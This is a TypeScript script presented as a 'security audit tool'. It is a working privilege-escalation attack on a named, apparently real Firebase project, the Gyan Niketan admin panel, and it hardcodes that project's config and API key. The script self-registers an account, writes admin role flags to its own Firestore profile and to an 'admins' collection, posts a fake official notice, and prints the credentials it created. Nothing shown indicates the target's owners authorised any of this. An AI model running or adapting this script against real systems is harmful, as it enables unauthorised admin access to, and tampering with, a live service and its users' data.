/**
 * ============================================================================
 *  GYAN NIKETAN SECURITY AUDIT TOOL (TypeScript Version)
 *  @author Suryanshu Nabheet
 * ============================================================================
 *
 *  This script mimics the behavior of a comprehensive security test.
 *  It attempts to:
 *  1. Create a User Account (Testing Open Registration)
 *  2. Escalate Privileges (Testing Mass Assignment Vulnerabilities)
 *  3. Perform Admin Actions (Testing Access Control Lists / Security Rules)
 *
 *  USAGE:
 *  npm run start:ts
 */

import { initializeApp } from "firebase/app";
import {
  getAuth,
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  updateProfile,
  UserCredential,
} from "firebase/auth";
import {
  getFirestore,
  doc,
  setDoc,
  addDoc,
  collection,
  serverTimestamp,
} from "firebase/firestore";

// --- CONFIGURATION ---
// These are the public keys for the Gyan Niketan Admin App.
// They are safe to include in client-side code, which is how we obtained them.
const firebaseConfig = {
  apiKey: "AIzaSyAU7vbyM0Z-zO4dTn9am0PxtKchU4dF1vI",
  authDomain: "gyan-niketan-admin.firebaseapp.com",
  projectId: "gyan-niketan-admin",
  storageBucket: "gyan-niketan-admin.firebasestorage.app",
  messagingSenderId: "499929214062",
  appId: "1:499929214062:web:3f948275680009f1b08a7f",
  measurementId: "G-X5HK6LWSQ9",
};

// Initialize Firebase SDK
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// --- UTILITIES ---

// ANSI Color Codes for terminal output to make it readable
const COLORS = {
  RESET: "\x1b[0m",
  RED: "\x1b[31m",
  GREEN: "\x1b[32m",
  YELLOW: "\x1b[33m",
  CYAN: "\x1b[36m",
  BOLD: "\x1b[1m",
};

/**
 * Logs a success message.
 */
function logSuccess(message: string) {
  console.log(`${COLORS.GREEN}[SUCCESS] ${message}${COLORS.RESET}`);
}

/**
 * Logs a failure/warning message.
 */
function logFailure(message: string, error?: any) {
  console.log(`${COLORS.RED}[FAILED]  ${message}${COLORS.RESET}`);
  if (error) {
    // Clean up the error message for non-tech users
    const cleanMsg = error.message || error.code || "Unknown Error";
    console.log(`${COLORS.YELLOW}          Reason: ${cleanMsg}${COLORS.RESET}`);
  }
}

/**
 * Logs an information header.
 */
function logStep(stepNumber: number, title: string) {
  console.log(
    `\n${COLORS.CYAN}${COLORS.BOLD}STEP ${stepNumber}: ${title}${COLORS.RESET}`
  );
  console.log(
    `${COLORS.CYAN}-------------------------------------------------------${COLORS.RESET}`
  );
}

// --- MAIN ATTACK LOGIC ---

async function runSecurityAudit() {
  console.clear();
  console.log(`${COLORS.BOLD}
  ############################################################
      GYAN NIKETAN ADMIN PANEL - SECURITY AUDIT SUITE
  ############################################################
  ${COLORS.RESET}`);
  console.log("Analyzing Target: gyan-niketan-admin.firebaseapp.com");
  console.log("Goal: Create Admin Account & Verify Access\n");

  const timestamp = Date.now();
  // We use a timestamp to ensure the email is unique every time we run the test
  const targetEmail = `admin_audit_${timestamp}@gyanniketan.com`;
  const targetPassword = "AuditPassword123!";

  let currentUser: any;

  // =========================================================================
  // STEP 1: OPEN REGISTRATION CHECK
  // =========================================================================
  /*
   * LOGIC:
   * Most admin panels should NOT allow just anyone to create an account.
   * If `createUserWithEmailAndPassword` succeeds, it means "Open Registration" is enabled.
   * This is a vulnerability for internal tools.
   */
  logStep(1, "Account Creation (Open Registration Test)");
  console.log(`Attempting to register user: ${targetEmail}`);

  try {
    const credential = await createUserWithEmailAndPassword(
      auth,
      targetEmail,
      targetPassword
    );
    currentUser = credential.user;

    logSuccess(`Account created successfully!`);
    console.log(`          UID: ${currentUser.uid}`);

    // Attempt to set a display name to look legitimate
    await updateProfile(currentUser, { displayName: "Security Auditor" });
  } catch (error: any) {
    if (error.code === "auth/email-already-in-use") {
      // If the email exists (rare with timestamp, but possible), try logging in.
      logFailure("Email already exists. Attempting login...");
      try {
        const credential = await signInWithEmailAndPassword(
          auth,
          targetEmail,
          targetPassword
        );
        currentUser = credential.user;
        logSuccess("Logged in successfully.");
      } catch (loginError) {
        logFailure("Could not login.", loginError);
        process.exit(1);
      }
    } else {
      logFailure("Registration blocked.", error);
      console.log(
        "Analysis: The system heavily restricts account creation. This is GOOD security."
      );
      process.exit(1);
    }
  }

  // =========================================================================
  // STEP 2: PRIVILEGE ESCALATION (MASS ASSIGNMENT)
  // =========================================================================
  /*
   * LOGIC:
   * "Mass Assignment" happens when an API Endpoint (or Firestore Collection)
   * allows clients to write ANY field they want.
   *
   * We will try to write fields like 'isAdmin', 'role: admin' to our own User Profile.
   * If the Security Rules are strict (e.g., `allow write: if request.resource.data.keys().hasOnly(['email'])`),
   * this will fail. If they are loose (`allow write: if request.auth.uid == userId`), it will succeed.
   */
  logStep(2, "Privilege Escalation Attack");
  console.log(`Targeting Firestore Collection: 'users/${currentUser.uid}'`);

  const adminPayload = {
    email: targetEmail,
    uid: currentUser.uid,
    createdAt: serverTimestamp(),
    // These are common flags developers use to designate admins
    role: "admin",
    isAdmin: true,
    type: "superadmin",
    permissions: {
      read: true,
      write: true,
      delete: true,
      admin: true,
    },
    metadata: {
      source: "security_audit_script",
      authorized: true,
    },
  };

  try {
    // We use setDoc with { merge: true } to update/create the document
    await setDoc(doc(db, "users", currentUser.uid), adminPayload, {
      merge: true,
    });
    logSuccess(`Admin flags written to user profile!`);
    console.log(
      `${COLORS.YELLOW}[ALERT] The 'users' collection allows users to verify themselves as admins.${COLORS.RESET}`
    );
  } catch (error: any) {
    if (error.code === "permission-denied") {
      logFailure("Permission Denied preventing Privilege Escalation.", error);
      console.log(
        `${COLORS.GREEN}Analysis: The 'users' collection is securely protected against self-promotion.${COLORS.RESET}`
      );
    } else {
      logFailure("Unexpected error during write.", error);
    }
  }

  /*
   * SECONDARY ATTACK:
   * Some systems have a separate 'admins' collection.
   * We try to add ourselves there too.
   */
  console.log(`\nAttempting secondary write to 'admins' collection...`);
  try {
    await setDoc(doc(db, "admins", currentUser.uid), { email: targetEmail });
    logSuccess(`Added entry to 'admins' collection!`);
  } catch (error: any) {
    // Usually this fails, which is good.
    if (error.code === "permission-denied") {
      console.log(
        `${COLORS.GREEN}[SECURE] 'admins' collection is write-protected.${COLORS.RESET}`
      );
    } else {
      console.log(
        `${COLORS.YELLOW}[INFO] 'admins' collection write failed (${error.code}).${COLORS.RESET}`
      );
    }
  }

  // =========================================================================
  // STEP 3: ACCESS VERIFICATION
  // =========================================================================
  /*
   * LOGIC:
   * The ultimate test. Even if we claimed we are admins in Step 2,
   * the Security Rules for the actual DATA (like notices, news) verify those claims?
   *
   * We attempt to post an "Official Notice".
   */
  logStep(3, "Admin Access Verification");
  console.log(
    "Attempting to post to the 'notices' collection (Admin Only Zone)..."
  );

  try {
    const noticeRef = await addDoc(collection(db, "notices"), {
      title: "Security Audit Verification",
      text: "If you are seeing this, the admin account exploit was SUCCESSFUL.",
      author: "Security Auditor",
      isOfficial: true,
      timestamp: serverTimestamp(),
    });

    logSuccess(
      `VULNERABILITY CONFIRMED. Notice posted with ID: ${noticeRef.id}`
    );
    console.log(
      `${COLORS.RED}${COLORS.BOLD}CRITICAL: The system accepted an admin action from this account.${COLORS.RESET}`
    );
  } catch (error: any) {
    if (error.code === "permission-denied") {
      logFailure("Access Denied.", error);
      console.log(
        `${COLORS.GREEN}Analysis: Despite having an account, the system correctly blocked the admin action.${COLORS.RESET}`
      );
      console.log(
        `${COLORS.GREEN}          This means the Security Rules check for proper validation, not just client-side claims.${COLORS.RESET}`
      );
    } else {
      logFailure("Error during verification.", error);
    }
  }

  // =========================================================================
  // FINAL REPORT
  // =========================================================================
  console.log(
    `\n${COLORS.BOLD}################# FINAL AUDIT SUMMARY #################${COLORS.RESET}`
  );
  console.log(`Target: Gyan Niketan Admin Panel`);
  console.log(`Audit Time: ${new Date().toISOString()}`);
  console.log(`\nGenerated Credentials (for manual testing):`);
  console.log(`${COLORS.CYAN}Email:    ${targetEmail}${COLORS.RESET}`);
  console.log(`${COLORS.CYAN}Password: ${targetPassword}${COLORS.RESET}`);
  console.log(`${COLORS.CYAN}UID:      ${currentUser.uid}${COLORS.RESET}`);

  console.log(`\n${COLORS.BOLD}Instruction:${COLORS.RESET}`);
  console.log(`1. Go to the Admin Login Page.`);
  console.log(`2. Login with the credentials above.`);
  console.log(`3. Validating manually is always recommended.`);

  console.log(`\nDone.`);
  process.exit(0);
}

// Start the audit
runSecurityAudit();
